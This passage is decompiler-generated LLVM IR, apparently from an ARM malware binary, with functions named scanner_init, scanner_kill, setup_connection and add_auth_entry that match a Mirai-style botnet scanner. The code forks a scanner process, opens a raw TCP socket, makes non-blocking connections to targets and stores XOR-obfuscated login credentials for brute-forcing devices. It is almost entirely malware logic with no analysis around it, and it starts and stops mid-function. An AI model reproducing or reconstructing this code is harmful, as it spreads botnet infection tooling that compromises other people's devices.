  %v2_f310 = inttoptr i32 %v1_f310 to i32*
  store i32 %v0_f310, i32* %v2_f310, align 4
  %v2_f314 = call i32 @util_strlen(i8* %v2_f2c0)
  %v0_f31c = load i32, i32* @r4, align 4
  %v3_f320 = urem i32 %v0_f31c, %v2_f314
  %v2_f328 = add i32 %v3_f320, %v2_f324
  %v1_f32c = add i32 %v2_f328, -32
  %v2_f32c = inttoptr i32 %v1_f32c to i8*
  %v3_f32c = load i8, i8* %v2_f32c, align 1
  %v2_f330 = load i32, i32* @r5, align 4
  %v3_f330 = load i32, i32* %fp.global-to-local, align 4
  %v4_f330 = add i32 %v3_f330, %v2_f330
  %v5_f330 = inttoptr i32 %v4_f330 to i8*
  store i8 %v3_f32c, i8* %v5_f330, align 1
  %v0_f334 = load i32, i32* @r5, align 4
  %v1_f334 = add i32 %v0_f334, 1
  store i32 %v1_f334, i32* @r5, align 4
  %v1_f338 = load i32, i32* %sb.global-to-local, align 4
  %v9_f338 = icmp eq i32 %v1_f334, %v1_f338
  br i1 %v9_f338, label %dec_label_pc_f340, label %dec_label_pc_f2e0.dec_label_pc_f2e0_crit_edge

dec_label_pc_f2e0.dec_label_pc_f2e0_crit_edge:    ; preds = %dec_label_pc_f2e0
  %v1_f304.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f2e0

dec_label_pc_f340:                                ; preds = %dec_label_pc_f2e0, %entry
  %v1_f344 = call i32 @table_lock_val(i32 57)
  store i32 %v3_f294, i32* @r4, align 4
  store i32 %v6_f294, i32* @r5, align 4
  store i32 %v9_f294, i32* @r6, align 4
  ret i32 %v1_f344

; uselistorder directives
  uselistorder i32 %v2_f2e4, { 1, 0 }
  uselistorder i32 %v2_f2e0, { 1, 0, 2 }
  uselistorder i32* @global_var_24664.147, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_24660.151, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_2465c.149, { 2, 5, 3, 1, 0, 4 }
  uselistorder i32* @global_var_24658.145, { 2, 4, 1, 0, 3 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f370 = load i32, i32* @global_var_27184.161, align 4
  %v2_f378 = call i32 @kill(i32 %v2_f370, i32 9)
  ret i32 %v2_f378

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 5, 4, 3, 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f38c = load i32, i32* @r4, align 4
  store i32 %v3_f38c, i32* %stack_var_-16, align 4
  %v6_f38c = load i32, i32* @r5, align 4
  %v9_f38c = load i32, i32* @r6, align 4
  %v12_f38c = load i32, i32* @lr, align 4
  %v0_f390 = load i32, i32* @r0, align 4
  store i32 %v0_f390, i32* @r5, align 4
  %v1_f394 = add i32 %v0_f390, 4
  %v2_f394 = inttoptr i32 %v1_f394 to i32*
  %v3_f394 = load i32, i32* %v2_f394, align 4
  store i32 %v3_f394, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 62392, i32* @lr, align 4
  %v1_f3b4 = icmp ne i32 %v3_f394, -1
  call void @__pseudo_cond_branch(i1 %v1_f3b4, i32 ptrtoint (i32* @global_var_16310.35 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_f3c0 = load i32, i32* @r6, align 4
  store i32 %v0_f3c0, i32* %r2.global-to-local, align 4
  %v3_f3c4 = call i32 @socket(i32 2, i32 1, i32 %v0_f3c0)
  store i32 %v3_f3c4, i32* %r0.global-to-local, align 4
  %v7_f3c8 = icmp eq i32 %v3_f3c4, -1
  %v1_f3cc = load i32, i32* @r5, align 4
  %v2_f3cc = add i32 %v1_f3cc, 4
  %v3_f3cc = inttoptr i32 %v2_f3cc to i32*
  store i32 %v3_f3c4, i32* %v3_f3cc, align 4
  br i1 %v7_f3c8, label %entry.dec_label_pc_f444_crit_edge, label %dec_label_pc_f3d4

entry.dec_label_pc_f444_crit_edge:                ; preds = %entry
  %v1_f44c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f444

dec_label_pc_f3d4:                                ; preds = %entry
  %v2_f398 = ptrtoint i32* %stack_var_-32 to i32
  %v0_f3d4 = load i32, i32* @r5, align 4
  %v1_f3d4 = add i32 %v0_f3d4, 28
  store i32 %v1_f3d4, i32* %r0.global-to-local, align 4
  %v0_f3d8 = load i32, i32* @r6, align 4
  %v2_f3d8 = add i32 %v0_f3d4, 24
  %v3_f3d8 = inttoptr i32 %v2_f3d8 to i32*
  store i32 %v0_f3d8, i32* %v3_f3d8, align 4
  %v2_f3e0 = call i32 @util_zero(i32 %v1_f3d4, i32 256)
  store i32 %v2_f3e0, i32* %r0.global-to-local, align 4
  %v0_f3e4 = load i32, i32* @r5, align 4
  %v1_f3e4 = add i32 %v0_f3e4, 4
  %v2_f3e4 = inttoptr i32 %v1_f3e4 to i32*
  %v3_f3e4 = load i32, i32* %v2_f3e4, align 4
  store i32 %v3_f3e4, i32* @r4, align 4
  %v0_f3e8 = load i32, i32* @r6, align 4
  store i32 %v0_f3e8, i32* @r2, align 4
  store i32 %v3_f3e4, i32* %r0.global-to-local, align 4
  %v2_f3f4 = call i32 @__libc_fcntl(i32 %v3_f3e4, i32 3)
  %v1_f3fc = or i32 %v2_f3f4, 2048
  store i32 %v1_f3fc, i32* @r2, align 4
  %v0_f400 = load i32, i32* @r4, align 4
  store i32 %v0_f400, i32* %r0.global-to-local, align 4
  %v2_f404 = call i32 @__libc_fcntl(i32 %v0_f400, i32 4)
  store i32 %v2_f404, i32* %r0.global-to-local, align 4
  %v2_f40c = load i32, i32* @global_var_2469c.163, align 4
  store i32 %v2_f40c, i32* %r2.global-to-local, align 4
  %v1_f414 = load i32, i32* @r5, align 4
  %v2_f414 = add i32 %v1_f414, 12
  %v3_f414 = inttoptr i32 %v2_f414 to i32*
  store i32 1, i32* %v3_f414, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_f420 = load i32, i32* %r2.global-to-local, align 4
  %v1_f420 = load i32, i32* @r5, align 4
  %v2_f420 = add i32 %v1_f420, 8
  %v3_f420 = inttoptr i32 %v2_f420 to i32*
  store i32 %v0_f420, i32* %v3_f420, align 4
  %v0_f424 = load i32, i32* @r5, align 4
  %v1_f428 = add i32 %v0_f424, 4
  %v2_f428 = inttoptr i32 %v1_f428 to i32*
  %v3_f428 = load i32, i32* %v2_f428, align 4
  store i32 %v3_f428, i32* %r0.global-to-local, align 4
  %v1_f42c = add i32 %v0_f424, 20
  %v2_f42c = inttoptr i32 %v1_f42c to i16*
  %v3_f42c = load i16, i16* %v2_f42c, align 2
  %v4_f42c = zext i16 %v3_f42c to i32
  store i32 %v4_f42c, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_f440 = call i32 @__libc_connect(i32 %v3_f428, i32 %v2_f398, i32 16)
  store i32 %v3_f440, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f444

dec_label_pc_f444:                                ; preds = %entry.dec_label_pc_f444_crit_edge, %dec_label_pc_f3d4
  %v1_f44c = phi i32 [ %v1_f44c.pre, %entry.dec_label_pc_f444_crit_edge ], [ %v3_f440, %dec_label_pc_f3d4 ]
  %v2_f448 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f448, i32* @r4, align 4
  store i32 %v6_f38c, i32* @r5, align 4
  store i32 %v9_f38c, i32* @r6, align 4
  store i32 %v12_f38c, i32* @lr, align 4
  ret i32 %v1_f44c

; uselistorder directives
  uselistorder i32 %v3_f3c4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @util_zero, { 12, 9, 8, 7, 11, 10, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f444, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_f454 = load i32, i32* @r4, align 4
  %v6_f454 = load i32, i32* @r5, align 4
  %v9_f454 = load i32, i32* @r6, align 4
  %v12_f454 = load i32, i32* @r7, align 4
  %v15_f454 = load i32, i32* @r8, align 4
  %v18_f454 = load i32, i32* @sb, align 4
  %v21_f454 = load i32, i32* @sl, align 4
  %v24_f454 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_24668.165 to i32), i32* @fp, align 4
  %v2_f45c = load i32, i32* @global_var_24668.165, align 4
  store i32 ptrtoint (i32* @global_var_24694.167 to i32), i32* @sl, align 4
  %v1_f468 = add i32 %v2_f45c, 1
  store i32 %v1_f468, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_f474 = load i32, i32* @global_var_24694.167, align 4
  store i32 %v2_f474, i32* %r0.global-to-local, align 4
  %v3_f478 = mul i32 %v1_f468, 16
  store i32 %v3_f478, i32* %r1.global-to-local, align 4
  %v4_f480 = inttoptr i32 %v2_f474 to i32*
  %v5_f480 = call i32 @realloc(i32* %v4_f480, i32 %v3_f478, i32 %arg3, i32 %v1_f468)
  %v2_f484 = load i32, i32* @global_var_24668.165, align 4
  store i32 %v2_f484, i32* %r2.global-to-local, align 4
  store i32 %v5_f480, i32* @r8, align 4
  %v0_f48c = load i32, i32* @r5, align 4
  store i32 %v0_f48c, i32* %r0.global-to-local, align 4
  %v1_f494 = load i32, i32* @sl, align 4
  %v2_f494 = inttoptr i32 %v1_f494 to i32*
  store i32 %v5_f480, i32* %v2_f494, align 4
  %v1_f498 = inttoptr i32 %v0_f48c to i8*
  %v2_f498 = call i32 @util_strlen(i8* %v1_f498)
  %sext = mul i32 %v2_f498, 16777216
  %v1_f49c = sdiv i32 %sext, 16777216
  %v2_f49c = add nsw i32 %v1_f49c, 1
  store i32 %v2_f49c, i32* @r4, align 4
  store i32 %v1_f49c, i32* @r7, align 4
  store i32 %v2_f49c, i32* @r0, align 4
  %v0_f4a8 = call i32 @malloc()
  store i32 %v0_f4a8, i32* %r0.global-to-local, align 4
  %v0_f4ac = load i32, i32* @r5, align 4
  store i32 %v0_f4ac, i32* %r1.global-to-local, align 4
  %v0_f4b0 = load i32, i32* @r4, align 4
  store i32 %v0_f4b0, i32* %r2.global-to-local, align 4
  store i32 %v0_f4a8, i32* %r6.global-to-local, align 4
  %v3_f4b8 = call i32 @util_memcpy(i32 %v0_f4a8, i32 %v0_f4ac, i32 %v0_f4b0)
  store i32 %v3_f4b8, i32* %r0.global-to-local, align 4
  %v0_f4bc = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_f4bc, 1
  %extract.t6 = trunc i32 %v0_f4bc to i8
  br i1 %tmp22, label %dec_label_pc_f4e0, label %dec_label_pc_f4c4

dec_label_pc_f4c4:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f4c8

dec_label_pc_f4c8:                                ; preds = %dec_label_pc_f4c8, %dec_label_pc_f4c4
  %v2_f4d0 = phi i32 [ %v1_f4d4, %dec_label_pc_f4c8 ], [ 0, %dec_label_pc_f4c4 ]
  %v1_f4c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_f4c8 = add i32 %v1_f4c8, %v2_f4d0
  %v3_f4c8 = inttoptr i32 %v2_f4c8 to i8*
  %v4_f4c8 = load i8, i8* %v3_f4c8, align 1
  %v6_f4c8 = zext i8 %v4_f4c8 to i32
  %v1_f4cc = xor i32 %v6_f4c8, 80
  store i32 %v1_f4cc, i32* %r3.global-to-local, align 4
  %v1_f4d0 = trunc i32 %v1_f4cc to i8
  store i8 %v1_f4d0, i8* %v3_f4c8, align 1
  %v0_f4d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f4d4 = add i32 %v0_f4d4, 1
  store i32 %v1_f4d4, i32* %r2.global-to-local, align 4
  %v1_f4d8 = load i32, i32* @r7, align 4
  %v9_f4d8 = icmp eq i32 %v1_f4d4, %v1_f4d8
  br i1 %v9_f4d8, label %dec_label_pc_f4e0.loopexit, label %dec_label_pc_f4c8

dec_label_pc_f4e0.loopexit:                       ; preds = %dec_label_pc_f4c8
  %extract.t = trunc i32 %v1_f4d4 to i8
  br label %dec_label_pc_f4e0

dec_label_pc_f4e0:                                ; preds = %dec_label_pc_f4e0.loopexit, %entry
  %v0_f4f0.off0 = phi i8 [ %extract.t, %dec_label_pc_f4e0.loopexit ], [ %extract.t6, %entry ]
  %v2_f4e0 = load i32, i32* @global_var_24668.165, align 4
  %v2_f4e4 = load i32, i32* @global_var_24694.167, align 4
  %v3_f4e8 = mul i32 %v2_f4e0, 16
  store i32 %v3_f4e8, i32* @sb, align 4
  %v2_f4ec = add i32 %v2_f4e4, %v3_f4e8
  store i32 %v2_f4ec, i32* %r2.global-to-local, align 4
  %v3_f4f0 = add i32 %v2_f4ec, 12
  %v4_f4f0 = inttoptr i32 %v3_f4f0 to i8*
  store i8 %v0_f4f0.off0, i8* %v4_f4f0, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_f484, i32* %r3.global-to-local, align 4
  %v0_f4fc = load i32, i32* %r6.global-to-local, align 4
  %v1_f4fc = load i32, i32* @r8, align 4
  %v5_f4fc = mul i32 %v2_f484, 16
  %v6_f4fc = add i32 %v1_f4fc, %v5_f4fc
  %v7_f4fc = inttoptr i32 %v6_f4fc to i32*
  store i32 %v0_f4fc, i32* %v7_f4fc, align 4
  %v2_f500 = load i32, i32* @global_var_24694.167, align 4
  store i32 %v2_f500, i32* @r7, align 4
  %v1_f504 = inttoptr i32 %arg2 to i8*
  %v2_f504 = call i32 @util_strlen(i8* %v1_f504)
  %sext1 = mul i32 %v2_f504, 16777216
  %v1_f508 = sdiv i32 %sext1, 16777216
  %v2_f508 = add nsw i32 %v1_f508, 1
  store i32 %v2_f508, i32* @r4, align 4
  store i32 %v1_f508, i32* @r6, align 4
  store i32 %v2_f508, i32* @r0, align 4
  %v0_f514 = call i32 @malloc()
  store i32 %v0_f514, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_f51c = load i32, i32* @r4, align 4
  store i32 %v0_f51c, i32* %r2.global-to-local, align 4
  store i32 %v0_f514, i32* %r5.global-to-local, align 4
  %v3_f524 = call i32 @util_memcpy(i32 %v0_f514, i32 %arg2, i32 %v0_f51c)
  store i32 %v3_f524, i32* %r0.global-to-local, align 4
  %v0_f528 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_f528, 1
  %extract.t8 = trunc i32 %v0_f528 to i8
  br i1 %tmp23, label %dec_label_pc_f54c, label %dec_label_pc_f530

dec_label_pc_f530:                                ; preds = %dec_label_pc_f4e0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f534

dec_label_pc_f534:                                ; preds = %dec_label_pc_f534, %dec_label_pc_f530
  %v2_f53c = phi i32 [ %v1_f540, %dec_label_pc_f534 ], [ 0, %dec_label_pc_f530 ]
  %v1_f534 = load i32, i32* %r5.global-to-local, align 4
  %v2_f534 = add i32 %v1_f534, %v2_f53c
  %v3_f534 = inttoptr i32 %v2_f534 to i8*
  %v4_f534 = load i8, i8* %v3_f534, align 1
  %v6_f534 = zext i8 %v4_f534 to i32
  %v1_f538 = xor i32 %v6_f534, 80
  store i32 %v1_f538, i32* %r3.global-to-local, align 4
  %v1_f53c = trunc i32 %v1_f538 to i8
  store i8 %v1_f53c, i8* %v3_f534, align 1
  %v0_f540 = load i32, i32* %r2.global-to-local, align 4
  %v1_f540 = add i32 %v0_f540, 1
  store i32 %v1_f540, i32* %r2.global-to-local, align 4
  %v1_f544 = load i32, i32* @r6, align 4
  %v9_f544 = icmp eq i32 %v1_f540, %v1_f544
  br i1 %v9_f544, label %dec_label_pc_f54c.loopexit, label %dec_label_pc_f534

dec_label_pc_f54c.loopexit:                       ; preds = %dec_label_pc_f534
  %extract.t7 = trunc i32 %v1_f540 to i8
  br label %dec_label_pc_f54c

dec_label_pc_f54c:                                ; preds = %dec_label_pc_f54c.loopexit, %dec_label_pc_f4e0
  %v0_f55c.off0 = phi i8 [ %extract.t7, %dec_label_pc_f54c.loopexit ], [ %extract.t8, %dec_label_pc_f4e0 ]
  %v2_f54c = load i32, i32* @global_var_24668.165, align 4
  store i32 %v2_f54c, i32* %r0.global-to-local, align 4
  %v2_f550 = load i32, i32* @global_var_24694.167, align 4
  %v3_f554 = mul i32 %v2_f54c, 16
  store i32 %v3_f554, i32* %r1.global-to-local, align 4
  %v2_f558 = or i32 %v3_f554, 13
  %v3_f55c = add i32 %v2_f558, %v2_f550
  %v4_f55c = inttoptr i32 %v3_f55c to i8*
  store i8 %v0_f55c.off0, i8* %v4_f55c, align 1
  store i32 ptrtoint (i16** @global_var_24698.169 to i32), i32* %r4.global-to-local, align 4
  %v2_f568 = load i16, i16* bitcast (i16** @global_var_24698.169 to i16*), align 4
  %v3_f568 = zext i16 %v2_f568 to i32
  store i32 %v3_f568, i32* %lr.global-to-local, align 4
  %v2_f570 = load i32, i32* @global_var_24694.167, align 4
  store i32 %v2_f570, i32* %r2.global-to-local, align 4
  %v0_f578 = load i32, i32* %r1.global-to-local, align 4
  %v2_f578 = add i32 %v0_f578, %v2_f570
  store i32 %v2_f578, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_24698.169 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_f580 = load i32, i32* @sb, align 4
  %v1_f580 = load i32, i32* @r7, align 4
  %v2_f580 = add i32 %v1_f580, %v0_f580
  store i32 %v2_f580, i32* %ip.global-to-local, align 4
  %v0_f584 = load i32, i32* %r0.global-to-local, align 4
  %v1_f584 = add i32 %v0_f584, 1
  store i32 %v1_f584, i32* %r0.global-to-local, align 4
  %v3_f588 = add i32 %v2_f578, 10
  %v4_f588 = inttoptr i32 %v3_f588 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_24698.169 to i32), i32 16), i32 16) to i16), i16* %v4_f588, align 2
  %v0_f58c = load i32, i32* %lr.global-to-local, align 4
  %v1_f58c = trunc i32 %v0_f58c to i16
  %v2_f58c = load i32, i32* %r1.global-to-local, align 4
  %v3_f58c = add i32 %v2_f58c, 8
  %v4_f58c = inttoptr i32 %v3_f58c to i16*
  store i16 %v1_f58c, i16* %v4_f58c, align 2
  %v0_f590 = load i32, i32* %r5.global-to-local, align 4
  %v1_f590 = load i32, i32* %ip.global-to-local, align 4
  %v2_f590 = add i32 %v1_f590, 4
  %v3_f590 = inttoptr i32 %v2_f590 to i32*
  store i32 %v0_f590, i32* %v3_f590, align 4
  %v1_f594 = load i32, i32* @fp, align 4
  %v2_f594 = inttoptr i32 %v1_f594 to i32*
  store i32 %v1_f584, i32* %v2_f594, align 4
  %v0_f598 = load i32, i32* %r3.global-to-local, align 4
  %v1_f598 = trunc i32 %v0_f598 to i16
  %v2_f598 = load i32, i32* %r4.global-to-local, align 4
  %v3_f598 = inttoptr i32 %v2_f598 to i16*
  store i16 %v1_f598, i16* %v3_f598, align 2
  store i32 %v3_f454, i32* @r4, align 4
  store i32 %v6_f454, i32* @r5, align 4
  store i32 %v9_f454, i32* @r6, align 4
  store i32 %v12_f454, i32* @r7, align 4
  store i32 %v15_f454, i32* @r8, align 4
  store i32 %v18_f454, i32* @sb, align 4
  store i32 %v21_f454, i32* @sl, align 4
  store i32 %v24_f454, i32* @fp, align 4
  ret i32 %v1_f584

; uselistorder directives
  uselistorder i32 %v3_f554, { 1, 0 }
  uselistorder i32 %v1_f540, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f514, { 1, 0, 2 }
  uselistorder i32 %v3_f4e8, { 1, 0 }
  uselistorder i32 %v1_f4d4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f4a8, { 1, 0, 2 }
  uselistorder i32 %v2_f484, { 1, 0, 2 }
  uselistorder i32 %v3_f478, { 1, 0 }
  uselistorder i32 %v1_f468, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 18, 2, 19, 20, 21, 22, 23, 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp314 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i16, align 2
  %tmp342 = call i16 @__decompiler_undefined_function_1()
  %v6_f5b4 = load i32, i32* @r5, align 4
  %v18_f5b4 = load i32, i32* @sb, align 4
  %v21_f5b4 = load i32, i32* @sl, align 4
  %v24_f5b4 = load i32, i32* @fp, align 4
  %v0_f5c0 = call i32 @__libc_fork()
  store i32 %v0_f5c0, i32* %r0.global-to-local, align 4
  %v7_f5c4 = icmp eq i32 %v0_f5c0, -1
  %. = zext i1 %v7_f5c4 to i32
  %tmp345 = icmp slt i32 %v0_f5c0, 1
  %storemerge308 = select i1 %tmp345, i32 %., i32 1
  store i32 %storemerge308, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_27184.161 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5e0 = icmp eq i32 %storemerge308, 0
  store i1 %v2_f5e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_f5c0, i32* @global_var_27184.161, align 4
  br i1 %v2_f5e0, label %dec_label_pc_f8c0, label %dec_label_pc_f5ec

dec_label_pc_f5ec:                                ; preds = %entry
  store i32 %v6_f5b4, i32* @r5, align 4
  store i32 %v18_f5b4, i32* @sb, align 4
  store i32 %v21_f5b4, i32* @sl, align 4
  store i32 %v24_f5b4, i32* @fp, align 4
  ret i32 %v0_f5c0

dec_label_pc_f8c0:                                ; preds = %entry
  %v0_f8c0 = call i32 @util_local_addr()
  store i32 %v0_f8c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_27164.91 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_f8c0, i32* @global_var_27164.91, align 4
  %v1_f8cc = call i32 @rand_init(i32 %v0_f8c0)
  %v0_f8d0 = load i32, i32* @r4, align 4
  store i32 %v0_f8d0, i32* %r0.global-to-local, align 4
  %v1_f8d4 = inttoptr i32 %v0_f8d0 to i32*
  %v2_f8d4 = call i32 @__GI_time(i32* %v1_f8d4)
  store i32 ptrtoint (i32* @global_var_2469c.163 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_f8d4, i32* @global_var_2469c.163, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_f8e8 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_2717c.174 to i32), i32* %r3.global-to-local, align 4
  %v0_f8f0 = load i32, i32* @r4, align 4
  %v5_f8f0 = trunc i32 %v0_f8f0 to i16
  store i16 %v5_f8f0, i16* %stack_var_-52, align 2
  store i32 %v2_f8e8, i32* @global_var_2717c.174, align 4
  store i32 %v0_f8f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f8fc

dec_label_pc_f8fc:                                ; preds = %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge, %dec_label_pc_f8c0
  %v2_f908 = phi i32 [ %v2_f908.pre, %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge ], [ %v2_f8e8, %dec_label_pc_f8c0 ]
  %v0_f910 = phi i32 [ %v0_f940, %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge ], [ %v0_f8f0, %dec_label_pc_f8c0 ]
  %v3_f8fc162 = phi i16 [ %v5_f940, %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge ], [ %v5_f8f0, %dec_label_pc_f8c0 ]
  %v4_f8fc = sext i16 %v3_f8fc162 to i32
  %v3_f904 = mul i32 %v0_f910, 256
  store i32 %v3_f904, i32* %ip.global-to-local, align 4
  store i32 %v2_f908, i32* @lr, align 4
  %v2_f918 = mul nsw i32 %v4_f8fc, 288
  %v2_f91c = mul i32 %v0_f910, 288
  %v1_f920 = add nsw i32 %v4_f8fc, 1
  store i32 %v1_f920, i32* %r0.global-to-local, align 4
  %v2_f924 = add i32 %v2_f918, %v2_f908
  store i32 %v2_f924, i32* %r2.global-to-local, align 4
  %v2_f928 = add i32 %v2_f91c, %v2_f908
  store i32 %v2_f928, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_f938 = add i32 %v2_f924, 4
  %v3_f938 = inttoptr i32 %v2_f938 to i32*
  store i32 -1, i32* %v3_f938, align 4
  %v0_f93c = load i32, i32* @r5, align 4
  %v1_f93c = load i32, i32* %r1.global-to-local, align 4
  %v2_f93c = add i32 %v1_f93c, 12
  %v3_f93c = inttoptr i32 %v2_f93c to i32*
  store i32 %v0_f93c, i32* %v3_f93c, align 4
  %v0_f940 = load i32, i32* %r0.global-to-local, align 4
  %v5_f940 = trunc i32 %v0_f940 to i16
  %v7_f944 = icmp sgt i16 %v3_f8fc162, 254
  br i1 %v7_f944, label %dec_label_pc_f948, label %dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge

dec_label_pc_f8fc.dec_label_pc_f8fc_crit_edge:    ; preds = %dec_label_pc_f8fc
  %v2_f908.pre = load i32, i32* @global_var_2717c.174, align 4
  br label %dec_label_pc_f8fc

dec_label_pc_f948:                                ; preds = %dec_label_pc_f8fc
  store i16 %v5_f940, i16* %stack_var_-52, align 2
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_f954 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_f954, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_27180.176 to i32), i32* %r2.global-to-local, align 4
  %v2_f95c = icmp eq i32 %v3_f954, -1
  store i1 %v2_f95c, i1* %cpsr_c.global-to-local, align 1
  %v7_f95c = icmp eq i32 %v3_f954, -1
  store i1 %v7_f95c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f954, i32* @r4, align 4
  store i32 %v3_f954, i32* @global_var_27180.176, align 4
  br i1 %v7_f95c, label %dec_label_pc_10ac8, label %dec_label_pc_f96c

dec_label_pc_f96c:                                ; preds = %dec_label_pc_f948
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_f970 = load i32, i32* @r5, align 4
  store i32 %v0_f970, i32* @r2, align 4
  %v2_f974 = call i32 @__libc_fcntl(i32 %v3_f954, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_f97c = or i32 %v2_f974, 2048
  store i32 %v1_f97c, i32* @r2, align 4
  %v0_f980 = load i32, i32* @r4, align 4
  store i32 %v0_f980, i32* %r0.global-to-local, align 4
  %v2_f984 = call i32 @__libc_fcntl(i32 %v0_f980, i32 4)
  %v2_f98c = load i32, i32* @global_var_27180.176, align 4
  store i32 %v2_f98c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_f998 = load i32, i32* @r5, align 4
  store i32 %v0_f998, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_f9a0 = ptrtoint i16* %stack_var_-52 to i32
  store i32 %v2_f9a0, i32* %r3.global-to-local, align 4
